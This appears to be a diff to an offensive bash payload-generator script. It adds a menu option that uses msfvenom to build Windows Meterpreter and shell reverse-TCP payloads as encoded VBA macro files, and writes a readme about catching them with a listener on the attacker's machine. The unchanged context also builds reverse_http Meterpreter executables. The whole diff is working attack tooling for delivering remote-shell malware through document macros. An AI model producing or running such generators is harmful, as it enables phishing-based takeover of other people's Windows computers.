@@ -340,6 +340,7 @@ elif [[ $input == "4" ]]; then ## Windows
     echo -e "[2] Meterpreter"
     echo -e "[3] Creat user acount"
     echo -e "[4] http"
+    echo -e "[5] macros"
     read -p "[+] Type?  " ty
     if [[ $ty == "1" ]]; then
         echo -e "\n${BLUE}[+] Powershell:${XX}"
@@ -409,5 +410,18 @@ elif [[ $input == "4" ]]; then ## Windows
             msfvenom -p windows/meterpreter/reverse_http LHOST=$IP LPORT=$PO  -f exe > Payload_List/http/rev_http.exe
             msfvenom -p windows/meterpreter_reverse_http LHOST=$IP LPORT=$PO HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > Payload_List/http/metpret_rev_http.exe
         echo -e "\n${RED}DONE, look into Payload_List/http${XX}"
+    elif [[ $ty == "5" ]]; then
+        echo -e "\n${BLUE}[+] Creating macros Payload:${XX}"
+        mkdir Payload_List/macros 2>/dev/null
+            echo -e "[*] The following binaries run with meterpreter, make sure you set the payload and other options on your meterpreter:" > Payload_List/macros/Read_Me.txt
+            echo -e "[*] https://www.offensive-security.com/metasploit-unleashed/vbscript-infection-methods/" >> Payload_List/macros/Read_Me.txt
+            echo -e "\n- set payload windows/meterpreter/reverse_tcp for macros.txt" >> Payload_List/macros/Read_Me.txt
+            echo -e "\n[*] The following Reverse Shell will run with netcat listener on the attacker pc or you may use meterpreter with it, just set the payload and other options:" > Payload_List/macros/Read_Me.txt
+            echo -e "\n- set payload windows/shell/reverse_tcp for shell_macros.txt" >> Payload_List/macros/Read_Me.txt
+            echo -e "\n- set payload windows/shell_reverse_tcp for shell_rev_macros.txt" >> Payload_List/macros/Read_Me.txt
+            msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -e x86/shikata_ga_nai -f vba-exe -o Payload_List/macros/macros.txt
+            msfvenom -p windows/shell/reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/macros/shell_macros.txt
+            msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f vba-exe > Payload_List/macros/shell_rev_macros.txt          
+        echo -e "\n${RED}DONE, look into Payload_List/macros${XX}"
     fi
 fi
